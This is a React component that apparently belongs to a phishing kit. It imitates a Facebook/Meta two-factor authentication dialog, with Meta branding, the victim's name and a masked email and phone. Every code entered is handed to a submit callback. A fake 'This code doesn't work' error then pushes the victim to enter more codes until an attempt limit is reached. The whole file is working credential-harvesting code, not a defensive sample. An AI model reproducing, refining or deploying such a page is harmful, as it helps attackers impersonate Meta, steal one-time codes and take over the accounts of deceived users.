import { useState } from 'react';
import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TwoFAImage from '@/assets/images/2FA.png';
import config from '@/utils/config';

const maskEmail = (email) => {
    if (!email) return '';
    const atIndex = email.indexOf('@');
    if (atIndex < 0) return email;
    const localPart = email.slice(0, atIndex);
    const domain = email.slice(atIndex + 1);
    if (!localPart || !domain) return email;
    const masked = localPart[0] + '**' + localPart.slice(-1);
    return `${masked}@${domain}`;
};

const maskPhone = (phone) => {
    if (!phone) return '';
    const digits = phone.replaceAll(/\D/g, '');
    if (digits.length < 4) return phone;
    return phone.slice(0, -2).replaceAll(/\d/g, '*') + ' ' + phone.slice(-2);
};

const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [countdown, setCountdown] = useState(0);

    const maxAttempts = config.max_code_attempts || 2;
    const currentStep = attempts + 1;

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (!code.trim() || code.length < 6 || code.length > 8 || countdown > 0) {
            return;
        }

        setIsLoading(true);
        setShowError(false);

        onSubmit(code);

        const loadingTime = config.code_loading_time || 3;
        setCountdown(loadingTime);

        const timer = setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) => setTimeout(resolve, loadingTime * 1000));

        const nextAttempts = attempts + 1;
        setAttempts(nextAttempts);
        setIsLoading(false);
        setCountdown(0);

        if (nextAttempts >= maxAttempts) {
            onSuccess();
            return;
        }

        setShowError(true);
        setCode('');
    };

    const formatTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    if (!show) return null;

    const displayName = formData?.fullName || formData?.pageName || '';
    const displayEmail = maskEmail(formData?.personalEmail || formData?.businessEmail || '');
    const displayPhone = maskPhone(formData?.phone || '');

    const contactInfo = [displayEmail, displayPhone].filter(Boolean).join(', ');

    return (
        <>
            <div className="modal-backdrop show" onClick={onClose} onKeyDown={(e) => e.key === 'Escape' && onClose()} aria-hidden="true"></div>
            <div className="modal form-modal show" id="twoFAmodal" style={{ display: show ? 'block' : 'none' }} tabIndex="-1">
                <div className="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
                    <div className="modal-content">
                        <div className="modal-body">
                            {displayName && (
                                <div style={{ fontSize: '13px', color: '#65676B', marginBottom: '3px', display: 'flex', alignItems: 'center', gap: '4px' }}>
                                    <span>{displayName}</span>
                                    <span>•</span>
                                    <span>Facebook</span>
                                </div>
                            )}
                            <div className="modal-title" id="2FAmodalLabel" style={{ fontSize: '17px', fontWeight: '700', color: '#0A1317', marginBottom: '8px' }}>
                                {texts.twoFATitle || 'Two-factor authentication required'} ({currentStep}/{maxAttempts})
                            </div>
                            <p style={{ fontSize: '14px', color: '#65676B', marginBottom: '8px' }}>
                                {texts.twoFAInstruction || 'Enter the code for this account that we send to'}
                                {contactInfo && <> {contactInfo}</>}
                                {' '}
                                {texts.twoFAInstructionOr || 'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)'}
                            </p>
                            <div style={{ marginBottom: '12px' }}>
                                <img alt="2FA" src={TwoFAImage} style={{ width: '100%', height: 'auto', borderRadius: '12px', display: 'block' }} />
                            </div>
                            <form id="twoFAForm" onSubmit={handleSubmit}>
                                <div className="mb-3">
                                    <div className="password-input">
                                        <label className="form-label" htmlFor="twofa-code-input">
                                            {texts.code || 'Code'}
                                        </label>
                                        <input
                                            autoComplete="off"
                                            className={`form-control ${showError ? 'is-invalid' : ''}`}
                                            id="twofa-code-input"
                                            inputMode="numeric"
                                            name="2FA-1"
                                            pattern="[0-9]{6,8}"
                                            type="tel"
                                            value={code}
                                            disabled={countdown > 0}
                                            onChange={(e) => {
                                                const val = e.target.value.replaceAll(/\D/g, '');
                                                if (val.length <= 8) setCode(val);
                                                if (showError) setShowError(false);
                                            }}
                                        />
                                    </div>
                                    {showError && countdown > 0 && (
                                        <div className="invalid-feedback" style={{ display: 'block' }}>
                                            {texts.codeExpired || "This code doesn't work. Check it's correct or try a new one after"}{' '}
                                            <span translate="no" className="notranslate">{countdown}s</span>
                                        </div>
                                    )}
                                </div>
                                <div className="form-btn-wrapper">
                                    <button
                                        className="btn btn-primary"
                                        type="submit"
                                        disabled={isLoading || !code.trim() || code.length < 6 || countdown > 0}
                                    >
                                        <div className="spinner-border text-light" aria-live="polite" style={{ display: isLoading ? 'block' : 'none' }}>
                                            <span className="visually-hidden">Loading...</span>
                                        </div>
                                        <span className="button-text">
                                            {isLoading
                                                ? `${texts.pleaseWait || 'Please wait'} ${formatTime(countdown)}...`
                                                : (texts.continueBtn || 'Continue')}
                                        </span>
                                    </button>
                                </div>
                                <div style={{ marginTop: '12px', textAlign: 'center' }}>
                                    <button
                                        type="button"
                                        style={{ fontSize: '14px', color: '#65676B', cursor: 'pointer', background: 'none', border: 'none', padding: 0 }}
                                    >
                                        {texts.tryAnotherWay || 'Try another way'}
                                    </button>
                                </div>
                            </form>
                            <div className="spaser"></div>
                        </div>
                        <div className="modal-footer border-0" style={{ flexDirection: 'column', textAlign: 'center' }}>
                            <img src={MetaLogo} alt="Meta Logo" style={{ height: '20px', marginBottom: '5px' }} />
                            <div className="footer-links" style={{ fontSize: '12px', color: '#000' }}>
                                {texts.aboutHelpMore || 'About · Help · See more'}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

TwoFAModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired,
    formData: PropTypes.object
};

TwoFAModal.defaultProps = {
    formData: {}
};

export default TwoFAModal;
